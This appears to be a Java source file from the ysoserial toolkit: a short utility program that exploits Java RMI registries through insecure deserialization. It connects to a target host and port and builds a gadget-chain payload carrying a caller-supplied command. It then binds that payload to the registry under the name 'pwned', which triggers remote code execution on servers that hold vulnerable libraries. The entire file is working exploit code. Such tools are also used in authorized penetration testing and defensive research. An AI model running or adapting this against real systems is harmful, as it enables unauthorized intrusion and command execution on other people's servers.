package ysoserial;

import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;

/*
 * Utility program for exploiting RMI registries running with required gadgets available in their ClassLoader
 */
public class RMIRegistryExploit {
	public static void main(String[] args) throws Exception {
		Registry registry = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));		
		String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
		Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);
		Object payload = payloadClass.newInstance().getObject(args[3]);
		Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", payload), Remote.class);
		registry.bind("pwned", remote);		
	}
}
